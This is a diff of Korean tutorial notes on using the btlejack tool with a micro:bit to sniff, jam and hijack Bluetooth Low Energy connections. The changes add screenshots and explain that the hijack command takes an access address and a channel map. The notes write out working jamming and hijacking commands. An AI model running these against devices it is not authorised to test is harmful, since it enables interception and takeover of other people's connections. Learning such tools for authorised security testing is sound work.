@@ -24,7 +24,7 @@ BLE 디바이스들을 sniff, jam, hijack 할 때 필요한 모든 것을 제공
 
 
 
-#### 처음 micro:bit 확인
+#### micro:bit 확인
 
 ~~~cmd
 $ btlejack -i
@@ -51,6 +51,10 @@ $ btlejack -s
 ~~~cmd
 $ btlejack -f 주소
 ~~~
+
+![1569207101975](C:\Users\윤소희 팀장\AppData\Roaming\Typora\typora-user-images\1569207101975.png)
+
+
 
 > ![1568772146653](C:\Users\윤소희 팀장\AppData\Roaming\Typora\typora-user-images\1568772146653.png)
 >
@@ -90,19 +94,27 @@ $ btlejack -f 액세스주소 -j
 
 
 
+
+
 #### 기존 연결 가로채기
 
 ~~~cmd
 $ btlejack -f 0x9c68fd30 -t -m 0x1fffffffff
 ~~~
 
-> 실제로는 어떤 값이 들어가는 것인지 확인해 봐야함. 액세스 주소 같음
+> 액세스 주소와 채널 맵을 순서대로 입력하면 된다.
+
+![1569215763005](C:\Users\윤소희 팀장\AppData\Roaming\Typora\typora-user-images\1569215763005.png)
+
+위 상태에서 조금 더 기다리면 hijacking된 내용이 나온다.
+
+![1569216694451](C:\Users\윤소희 팀장\AppData\Roaming\Typora\typora-user-images\1569216694451.png)
+
+
 
 이렇게 하면 터미널이 *btlejack>* 으로 바뀐다.
 
-
-
-아래 세가지 명령으로 하이재킹 된 장치와 상호작용 할 수 있다.
+하이재킹 된 기기와 상호 작용할 수 있는 프롬프트이다. 아래 세가지 명령을 내릴 수 있다.
 
 
 
